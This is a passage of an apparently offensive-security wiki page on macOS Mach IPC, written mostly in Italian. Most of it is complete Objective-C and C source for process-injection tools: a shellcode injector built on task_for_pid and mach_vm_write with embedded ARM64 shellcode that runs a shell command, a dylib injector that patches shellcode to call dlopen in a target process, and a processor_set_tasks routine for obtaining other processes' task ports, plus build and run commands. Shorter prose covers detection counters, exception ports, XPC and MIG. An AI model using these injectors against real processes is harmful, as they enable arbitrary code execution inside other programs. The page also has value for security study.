I thread hanno anche porte associate, che sono visibili dal task che chiama **`task_threads`** e dal processore con `processor_set_threads`. Un diritto di INVIO alla porta del thread consente di utilizzare le funzioni del sottosistema `thread_act`, come:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Qualsiasi thread può ottenere questa porta chiamando **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Puoi prendere un shellcode da:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compila** il programma precedente e aggiungi i **diritti** per poter iniettare codice con lo stesso utente (se no dovrai usare **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Per far funzionare questo su iOS, hai bisogno del diritto `dynamic-codesigning` per poter creare un'eseguibile in memoria scrivibile.

### Iniezione di Dylib in thread tramite Task port

In macOS **i thread** possono essere manipolati tramite **Mach** o utilizzando **l'api posix `pthread`**. Il thread che abbiamo generato nell'iniezione precedente è stato generato utilizzando l'api Mach, quindi **non è conforme a posix**.

È stato possibile **iniettare un semplice shellcode** per eseguire un comando perché **non aveva bisogno di lavorare con api** conformi a posix, solo con Mach. **Iniezioni più complesse** richiederebbero che il **thread** fosse anche **conforme a posix**.

Pertanto, per **migliorare il thread**, dovrebbe chiamare **`pthread_create_from_mach_thread`** che **creerà un pthread valido**. Poi, questo nuovo pthread potrebbe **chiamare dlopen** per **caricare un dylib** dal sistema, quindi invece di scrivere nuovo shellcode per eseguire azioni diverse, è possibile caricare librerie personalizzate.

Puoi trovare **dylibs di esempio** in (ad esempio quello che genera un log e poi puoi ascoltarlo):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In questa tecnica un thread del processo viene hijacked:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Quando si chiama `task_for_pid` o `thread_create_*` si incrementa un contatore nella struct task del kernel che può essere accessibile dalla modalità utente chiamando task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Quando si verifica un'eccezione in un thread, questa eccezione viene inviata al porto di eccezione designato del thread. Se il thread non la gestisce, allora viene inviata ai porti di eccezione del task. Se il task non la gestisce, allora viene inviata al porto host che è gestito da launchd (dove verrà riconosciuta). Questo è chiamato triage delle eccezioni.

Nota che alla fine, di solito, se non gestita correttamente, il report finirà per essere gestito dal demone ReportCrash. Tuttavia, è possibile che un altro thread nello stesso task gestisca l'eccezione, questo è ciò che fanno gli strumenti di reportistica degli arresti come `PLCreashReporter`.

## Other Objects

### Clock

Qualsiasi utente può accedere alle informazioni sull'orologio, tuttavia per impostare l'ora o modificare altre impostazioni è necessario essere root.

Per ottenere informazioni è possibile chiamare funzioni dal sottosistema `clock` come: `clock_get_time`, `clock_get_attributtes` o `clock_alarm`\
Per modificare i valori il sottosistema `clock_priv` può essere utilizzato con funzioni come `clock_set_time` e `clock_set_attributes`

### Processors and Processor Set

Le API del processore consentono di controllare un singolo processore logico chiamando funzioni come `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Inoltre, le API del **processor set** forniscono un modo per raggruppare più processori in un gruppo. È possibile recuperare il set di processori predefinito chiamando **`processor_set_default`**.\
Queste sono alcune API interessanti per interagire con il set di processori:

- `processor_set_statistics`
- `processor_set_tasks`: Restituisce un array di diritti di invio a tutti i task all'interno del set di processori
- `processor_set_threads`: Restituisce un array di diritti di invio a tutti i thread all'interno del set di processori
- `processor_set_stack_usage`
- `processor_set_info`

Come menzionato in [**questo post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in passato questo permetteva di bypassare la protezione precedentemente menzionata per ottenere i porti di task in altri processi per controllarli chiamando **`processor_set_tasks`** e ottenendo un porto host su ogni processo.\
Oggigiorno è necessario essere root per utilizzare quella funzione e questa è protetta, quindi sarà possibile ottenere questi porti solo su processi non protetti.

Puoi provarlo con:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
